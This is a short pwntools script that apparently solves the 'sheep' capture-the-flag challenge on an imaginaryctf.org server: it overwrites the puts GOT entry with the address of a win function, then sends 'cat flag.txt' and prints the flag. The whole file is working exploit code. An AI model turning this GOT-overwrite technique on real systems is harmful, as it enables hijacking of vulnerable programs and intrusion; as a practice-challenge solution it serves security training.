from pwn import *
elf = ELF('./sheep')
host,port = 'puzzler7.imaginaryctf.org',4444
local = False
win_addr = elf.sym.win
puts_addr = elf.got.puts
pwn_encode = lambda x: str(x).encode()
pwn_decode = lambda x: x.strip().decode()
try:
    p = elf.process() if local else remote(host,port)
    p.recvuntil(b'?\n')
    p.sendline(pwn_encode(puts_addr))
    p.recvuntil(b'?\n')
    p.sendline(pwn_encode(win_addr))
    p.clean()
    p.sendline(b'cat flag.txt')
    flag = pwn_decode(p.recv())
    print(f'flag: {flag}')
    p.close()
except Exception as e:
    print(f'Exception: {e}')
